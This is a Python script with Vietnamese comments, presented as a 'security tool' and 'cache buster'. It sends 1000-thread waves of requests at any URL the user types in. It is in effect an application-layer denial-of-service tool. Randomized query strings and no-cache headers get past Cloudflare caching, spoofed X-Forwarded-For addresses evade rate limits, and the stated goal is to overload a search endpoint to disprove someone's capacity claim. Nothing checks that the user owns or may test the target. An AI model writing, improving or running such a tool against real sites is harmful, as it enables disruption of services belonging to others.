import sys
import requests
import threading
import time
import random
import string
from colorama import Fore, Style, init

init(autoreset=True)

# CẤU HÌNH (Tăng số lượng thread lên nếu web họ thực sự mạnh)
TARGET_URL = ""
THREADS = 1000   # Số lượng yêu cầu đồng thời
LOOPS = 5      # Số vòng lặp
LATENCY_LOG = []

def print_banner():
    print(Fore.RED + """
    =======================================================
    SECURITY TOOL V11 - THE CACHE BUSTER (RESOURCE VAMPIRE)
    (Bypass Cloudflare Cache & Đo lường độ trễ thực tế)
    Level: ARCHITECT DESTROYER | Coder: Người anh em
    =======================================================
    """)

# HÀM TẠO CHUỖI NGẪU NHIÊN (ĐỂ NÉ CACHE)
def random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# HÀM TẠO IP GIẢ (ĐỂ NÉ RATE LIMIT CƠ BẢN)
def random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def vampire_attack(index):
    try:
        # KỸ THUẬT 1: CACHE BUSTING
        # Thêm tham số ngẫu nhiên vào URL để bắt server phải xử lý mới hoàn toàn
        # Giả lập hành vi tìm kiếm phức tạp (Tốn CPU nhất)
        bust_param = f"?q={random_string(5)}&sort=price_desc&filter={random_string(3)}&cache_buster={time.time()}"
        
        # Nếu URL đã có ? thì dùng &
        if "?" in TARGET_URL:
            full_url = f"{TARGET_URL}&nocache={random_string(8)}"
        else:
            full_url = f"{TARGET_URL}{bust_param}"

        headers = {
            'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (Stress-Test-{index})',
            'X-Forwarded-For': random_ip(), # Fake IP
            'Cache-Control': 'no-cache, no-store, must-revalidate', # Yêu cầu không cache
            'Pragma': 'no-cache'
        }

        start_time = time.time()
        res = requests.get(full_url, headers=headers, timeout=15)
        end_time = time.time()
        
        latency = (end_time - start_time) * 1000 # Đổi ra ms
        LATENCY_LOG.append(latency)

        # HIỂN THỊ TRỰC QUAN ĐỘ TRỄ
        status_color = Fore.GREEN
        if latency > 1000: status_color = Fore.YELLOW # > 1s là chậm
        if latency > 3000: status_color = Fore.RED    # > 3s là Rất chậm (Lag)
        
        print(f"{status_color}[Vampire #{index}] Code: {res.status_code} | Time: {latency:.0f}ms | URL: ...{full_url[-20:]}")

    except Exception as e:
        print(Fore.MAGENTA + f"[Vampire #{index}] TIMEOUT/ERROR (Server quá tải hoặc ngắt kết nối)")
        LATENCY_LOG.append(5000) # Phạt 5s nếu timeout

def visualize_latency():
    print(Fore.YELLOW + "\n" + "="*60)
    print(Fore.YELLOW + "   BIỂU ĐỒ SỨC KHỎE SERVER (LATENCY GRAPH)")
    print(Fore.YELLOW + "="*60)
    
    if not LATENCY_LOG: return

    avg_latency = sum(LATENCY_LOG) / len(LATENCY_LOG)
    max_latency = max(LATENCY_LOG)
    min_latency = min(LATENCY_LOG)
    
    print(f"Tổng Requests: {len(LATENCY_LOG)}")
    print(f"Độ trễ thấp nhất (Lúc rảnh): {Fore.GREEN}{min_latency:.0f}ms")
    print(f"Độ trễ cao nhất (Lúc tải):   {Fore.RED}{max_latency:.0f}ms")
    print(f"Độ trễ trung bình:           {Fore.YELLOW}{avg_latency:.0f}ms")
    
    print("\n[PHÂN TÍCH TÁC ĐỘNG]:")
    
    # Logic chứng minh
    if avg_latency > 2000 or max_latency > 5000:
        print(Fore.RED + "=> KẾT LUẬN: HỆ THỐNG 'YẾU SINH LÝ'.")
        print("   Anh nói chịu được 1 triệu request? Nhưng tôi chỉ gửi vài chục request 'không cache' thôi.")
        print(f"   Server đã phản hồi chậm tới {max_latency/1000:.1f} giây.")
        print("   -> Nếu 5000 khách hàng cùng bấm tìm kiếm, web anh sẽ TREO CỨNG.")
    elif avg_latency > 800:
        print(Fore.YELLOW + "=> KẾT LUẬN: HỆ THỐNG BẮT ĐẦU LAG.")
        print("   Server có dấu hiệu chậm đi rõ rệt khi bị bypass cache.")
    else:
        print(Fore.GREEN + "=> KẾT LUẬN: Server thực sự mạnh (Hoặc Cloudflare chặn quá tốt).")

    # Xuất file báo cáo
    with open(f"BAO_CAO_LATENCY_{int(time.time())}.txt", "w", encoding="utf-8") as f:
        f.write("BÁO CÁO KIỂM TRA HIỆU NĂNG THỰC TẾ (NO-CACHE STRESS)\n")
        f.write(f"Mục tiêu: {TARGET_URL}\n")
        f.write("-" * 50 + "\n")
        f.write(f"Trung bình: {avg_latency:.0f}ms\n")
        f.write(f"Cao nhất: {max_latency:.0f}ms\n")
        if avg_latency > 2000:
            f.write("ĐÁNH GIÁ: Server Backend KHÔNG chịu tải nổi các request tính toán phức tạp.\n")
            f.write("Con số '1 triệu request' chỉ là ảo tưởng về khả năng của Cloudflare.\n")
            
    print(Fore.GREEN + "\n[DONE] Đã lưu bằng chứng độ trễ.")

def main():
    global TARGET_URL
    print_banner()
    
    print("Mục tiêu: Chứng minh '1 triệu request' là ảo tưởng.")
    print("Cách làm: Gửi request 'độc nhất' để server phải tính toán thật, không được dùng Cache.")
    
    TARGET_URL = input(Fore.YELLOW + "Nhập URL (Ưu tiên link Tìm kiếm/Search): ").strip()
    
    print(Fore.YELLOW + f"\n[*] Đang thả {THREADS} Ma cà rồng hút tài nguyên CPU...")
    
    # Chạy nhiều vòng lặp để thấy sự suy giảm theo thời gian
    for loop in range(LOOPS):
        print(Fore.CYAN + f"\n--- Đợt tấn công thứ {loop + 1}/{LOOPS} ---")
        threads = []
        for i in range(THREADS):
            t = threading.Thread(target=vampire_attack, args=(i+1,))
            threads.append(t)
            t.start()
            time.sleep(0.1) # Rải đều ra một chút
            
        for t in threads:
            t.join()
            
    visualize_latency()

if __name__ == "__main__":
    main()